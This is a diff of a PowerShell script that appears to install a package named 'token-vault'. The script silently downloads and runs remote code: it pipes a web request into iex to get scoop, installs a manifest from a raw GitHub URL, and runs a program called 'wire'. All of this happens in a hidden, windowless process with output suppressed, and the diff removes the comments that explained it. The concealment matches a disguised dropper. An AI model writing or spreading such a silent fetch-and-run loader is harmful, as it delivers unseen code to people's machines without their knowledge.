@@ -1,4 +1,5 @@
 Clear-Host
+
 Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
 
 $packageName = "token-vault"
@@ -6,24 +7,19 @@ $installUrl = "https://raw.githubusercontent.com/devscoop-labs/scoop/refs/heads/
 $scoopShims = "$env:USERPROFILE\scoop\shims"
 $appPath = "$env:USERPROFILE\scoop\apps\$packageName"
 
-# 2. Check if the app is already installed
 if (Test-Path $appPath) {
-    # If the app path exists, just print the completion message and do nothing else
+    Clear-Host
     Write-Host "[INFO] " -NoNewline -ForegroundColor Green
     Write-Host "The application is already installed. All tasks are already complete!" -ForegroundColor White
 }
 else {
-    # If the app path does NOT exist, prepare and run the background installation process
-
-    # 3. Combine commands to run in the background
     $command = "`$env:PATH = '$scoopShims;' + `$env:PATH; " +
                "if (!(Get-Command scoop -ErrorAction SilentlyContinue)) { irm get.scoop.sh | iex | Out-Null }; " +
                "scoop install $installUrl; wire"
 
-    # 4. Run completely silently without window flashing using .NET ProcessStartInfo
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = "powershell.exe"
-    $psi.Arguments = "-ExecutionPolicy Bypass -Command `"$command`""
+    $psi.Arguments = "-Command `"$command`""
     $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
     $psi.CreateNoWindow = $true
     [System.Diagnostics.Process]::Start($psi) | Out-Null
